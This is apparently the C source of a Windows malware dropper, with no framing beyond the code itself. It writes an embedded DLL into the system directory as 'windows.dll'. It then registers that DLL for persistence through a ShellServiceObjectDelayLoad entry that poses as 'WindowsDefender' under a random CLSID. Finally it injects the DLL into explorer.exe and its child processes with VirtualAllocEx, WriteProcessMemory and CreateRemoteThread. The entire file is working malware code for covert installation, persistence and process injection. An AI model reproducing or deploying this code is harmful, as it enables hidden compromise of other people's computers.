#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <tlhelp32.h>
#include <malloc.h>
#include "ext.h"

#define alloca _alloca
#define DLLNAMES		"windows.dll"

char DLL[420]="\0";


BOOL WINAPI StartLibW(DWORD dwProcessId, PCWSTR pszLibFile)
{

   BOOL fOk = FALSE; // Assume that the function fails
   HANDLE hProcess = NULL, hThread = NULL;
   PWSTR pszLibFileRemote = NULL;

   __try
   {
      // Get a handle for the target process.
      hProcess = OpenProcess(
         PROCESS_QUERY_INFORMATION |   // Required by Alpha
         PROCESS_CREATE_THREAD     |   // For CreateRemoteThread
         PROCESS_VM_OPERATION      |   // For VirtualAllocEx/VirtualFreeEx
         PROCESS_VM_WRITE,             // For WriteProcessMemory
         FALSE, dwProcessId);
      if (hProcess == NULL) __leave;

      // Calculate the number of bytes needed for the DLL's pathname
      int cch = 1 + lstrlenW(pszLibFile);
      int cb  = cch * sizeof(WCHAR);

      // Allocate space in the remote process for the pathname
      pszLibFileRemote=(PWSTR)VirtualAllocEx(hProcess,NULL,cb,MEM_COMMIT,PAGE_READWRITE);
      if (pszLibFileRemote==NULL) __leave;

      // Copy the DLL's pathname to the remote process's address space
      if (!WriteProcessMemory(hProcess,pszLibFileRemote,(PVOID)pszLibFile,cb,NULL)) __leave;

      // Get the real address of LoadLibraryW in Kernel32.dll
      PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE) 
		  GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
      if (pfnThreadRtn == NULL) __leave;

      // Create a remote thread that calls LoadLibraryW(DLLPathname)
      hThread = CreateRemoteThread(hProcess,NULL,0,pfnThreadRtn,pszLibFileRemote,0,NULL);
      if (hThread == NULL) __leave;

      // Wait for the remote thread to terminate
      WaitForSingleObject(hThread, INFINITE);

      fOk = TRUE; // Everything executed successfully
   }
   __finally 
   { // Now, we can clean everthing up

      // Free the remote memory that contained the DLL's pathname
      if (pszLibFileRemote != NULL) VirtualFreeEx(hProcess, pszLibFileRemote, 0, MEM_RELEASE);

      if (hThread  != NULL) CloseHandle(hThread);

      if (hProcess != NULL) CloseHandle(hProcess);
   }

   return(fOk);
}

BOOL WINAPI StartLibA(DWORD dwProcessId, PCSTR pszLibFile) 
{

   // Allocate a (stack) buffer for the Unicode version of the pathname
   PWSTR pszLibFileW = (PWSTR) _alloca((lstrlenA(pszLibFile) + 1) * sizeof(WCHAR));

   // Convert the ANSI pathname to its Unicode equivalent
   wsprintfW(pszLibFileW, L"%S", pszLibFile);

   // Call the Unicode version of the function to actually do the work.
   return(StartLibW(dwProcessId, pszLibFileW));
}


DWORD GetExplorerPid(void)
{
		
	HANDLE hProcessSnap=NULL;	
	PROCESSENTRY32 pe32={0}; 
	
	hProcessSnap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	if (hProcessSnap!=(HANDLE)-1)
	{
		pe32.dwSize=sizeof(PROCESSENTRY32);			
		if(Process32First(hProcessSnap,&pe32)) 
		{
			do 
			{
				strlwr(pe32.szExeFile);
				if(strstr(pe32.szExeFile,"alg.exe")) 
				{
					CloseHandle(hProcessSnap);
					return pe32.th32ProcessID;
				}
				if(strstr(pe32.szExeFile,"explorer.exe")) 
				{
					CloseHandle(hProcessSnap);
					return pe32.th32ProcessID;
				}
				if(strstr(pe32.szExeFile,"csrss.exe")) 
				{
					CloseHandle(hProcessSnap);
					return pe32.th32ProcessID;
				}
			} 
			while(Process32Next(hProcessSnap,&pe32));         
		}
		CloseHandle(hProcessSnap);
	}
	return 0;
}

void StartDLL(PSTR DLL)
{	
	HANDLE hProcessSnap=NULL,hProc=NULL;	
	PROCESSENTRY32 pe32={0}; 
	DWORD ExplorerPID=0;

	ExplorerPID = GetExplorerPid();
	
	hProcessSnap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	if(hProcessSnap!=(HANDLE)-1)
	{
		pe32.dwSize=sizeof(PROCESSENTRY32);		
		if (Process32First(hProcessSnap,&pe32)) 
		{
			do 
			{				
				if(pe32.th32ParentProcessID==ExplorerPID || pe32.th32ProcessID==ExplorerPID)				
				{
					StartLibA(pe32.th32ProcessID,DLL);
				}
			} 
			while(Process32Next(hProcessSnap,&pe32));         
		}
		CloseHandle(hProcessSnap);
	}

	return;
}


void regstart()
{
	char sbuf[0x800]="\0",sbuf2[0x800]="\0";
	HKEY hKey;
	GUID guid;
	LPOLESTR lpOleStr=NULL;
	strcpy(DLL,DLLNAMES);

	GetSystemDirectory(sbuf2,sizeof(sbuf2));
	strcat(sbuf2,"\\");
	strcat(sbuf2,DLL);				
			
	CoInitialize(NULL);					
	if(CoCreateGuid(&guid)==0)
	{
		memset(sbuf,'\0',sizeof(sbuf));
		lpOleStr = new WCHAR[39];
		StringFromGUID2(guid,lpOleStr,39);
		WideCharToMultiByte(CP_ACP,NULL,lpOleStr,wcslen(lpOleStr),sbuf,sizeof(sbuf),NULL,NULL);
		delete [] lpOleStr;	
					
		RegCreateKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad",NULL,"",REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL);
		if(hKey)
		{
			RegSetValueEx(hKey,"WindowsDefender",NULL,REG_SZ,(LPBYTE)sbuf,strlen(sbuf)); 
			RegCloseKey(hKey);

			strcpy(sbuf2,"CLSID\\");
			strcat(sbuf2,sbuf);
			strcat(sbuf2,"\\InProcServer32");

			RegCreateKeyEx(HKEY_CLASSES_ROOT,sbuf2,NULL,"",REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL);
			if(hKey)
			{
				RegSetValueEx(hKey,NULL,NULL,REG_SZ,(LPBYTE)DLL,strlen(DLL));
				RegCloseKey(hKey);
			}			
		}
	}				
}



int WINAPI WinMain(HINSTANCE hInst,HINSTANCE,LPSTR,int nCmdShow)
{
	char buf3[420],windir[420],SySdire[MAX_PATH]; 
	HANDLE	FileHandle;
	DWORD	BytesWritten;

	GetWindowsDirectory(windir,sizeof(windir));
	GetModuleFileName(NULL,buf3,MAX_PATH);
	regstart();
	strcpy(DLL,DLLNAMES);
	GetSystemDirectory(SySdire, sizeof(SySdire));
	strcat(SySdire,"\\");
    strcat(SySdire, DLL);
	FileHandle = CreateFile(SySdire, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if(FileHandle != INVALID_HANDLE_VALUE)
	{
		WriteFile(FileHandle, DllZ, sizeof(DllZ), &BytesWritten, 0);
		CloseHandle(FileHandle);
	}
	StartDLL(SySdire);
	return 0;	
}


